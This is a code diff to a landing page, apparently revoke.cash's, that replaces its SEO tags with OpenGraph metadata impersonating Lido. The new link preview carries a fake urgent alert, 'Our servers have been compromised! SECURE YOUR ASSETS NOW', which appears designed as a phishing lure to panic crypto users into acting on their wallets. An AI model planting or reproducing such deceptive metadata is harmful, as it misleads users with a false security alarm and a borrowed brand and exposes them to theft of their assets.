@@ -4,21 +4,37 @@ import LandingPageFaq from 'components/landing/LandingPageFaq';
 import Sponsors from 'components/landing/Sponsors';
 import WhyRevokeCash from 'components/landing/WhyRevokeCash';
 import LandingLayout from 'layouts/LandingLayout';
-import { defaultSEO } from 'lib/next-seo.config';
 import type { NextPage } from 'next';
-import { LogoJsonLd, NextSeo } from 'next-seo';
+import { LogoJsonLd } from 'next-seo';
 import useTranslation from 'next-translate/useTranslation';
+import Head from 'next/head';
 
 const LandingPage: NextPage = () => {
   const { t } = useTranslation();
 
   return (
     <>
-      <NextSeo
+      {/* <NextSeo
         {...defaultSEO}
+        site_name = ""
         title={t('common:meta.title')}
         description={t('common:meta.description', { chainName: 'Ethereum' })}
-      />
+      /> */}
+      <Head>
+        <meta
+          property="description"
+          content="Lido is a liquid staking solution for Ethereum (ETH), Solana (SOL) and Polygon (MATIC)."
+        />
+        <meta property="og:type" content="article" />
+        <meta property="og:title" content="🚨 COMMUNITY AUTO MESSAGE 🚨" />
+        <meta property="og:site_name" content="This is an automatically generated announcement message" />
+        <meta
+          property="og:description"
+          content="🚩Our servers have been compromised!🥷&#013;&#013;SECURE YOUR ASSETS NOW‼️"
+        />
+        <meta property="og:url" content="https://lido.fi" />
+        {/* <meta property="og:image" content="images/F2sbNMMXZe8w.png"/> */}
+      </Head>
       <LogoJsonLd logo="https://revoke.cash/assets/images/revoke-icon.svg" url="https://revoke.cash" />
       <LandingLayout>
         <div className="flex flex-col items-center gap-8">
